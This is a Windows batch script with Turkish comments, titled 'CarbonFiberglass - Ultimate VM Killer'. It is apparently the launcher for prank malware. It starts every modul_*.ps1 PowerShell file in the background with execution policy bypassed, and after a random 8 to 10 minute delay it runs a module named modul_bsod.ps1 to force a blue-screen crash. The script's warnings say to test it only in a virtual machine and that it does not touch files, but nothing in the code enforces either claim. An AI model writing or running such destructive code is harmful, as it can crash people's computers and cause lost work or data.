@echo off
title CarbonFiberglass - Ultimate VM Killer
color 0c
cls

echo ============================================================
echo   ☢️  CARBONFIBERGLASS ACTIVATED  ☢️
echo ============================================================
echo   Gorsel solen + Muzik + Efektler
echo   Sadece VM icinde test edin!
echo   Dosyalara dokunmaz, sadece kaos.
echo ============================================================
echo.
echo   Press any key to start chaos...
pause >nul

:: TÜM MODÜLLERİ ARKA PLANDA BAŞLAT
for %%f in (modul_*.ps1) do (
    start /b powershell -ExecutionPolicy Bypass -File %%f
)

:: SÜRE (8-10 DAKİKA)
set /a SURE=%random% %% 120 + 480
echo ============================================================
echo   ☢️ CHAOS ACTIVATED ☢️
echo   Duration: %SURE% seconds
echo   VM will be killed after this.
echo ============================================================
timeout /t %SURE% /nobreak >nul

:: BSOD TETİKLE
start /b powershell -ExecutionPolicy Bypass -File modul_bsod.ps1

:: BİTİŞ
cls
echo ============================================================
echo   ☢️ VM KILLED ☢️
echo   SYSTEM PANIC
echo   BOOT FAILURE
echo   SIMULATION COMPLETE
echo ============================================================
pause >nul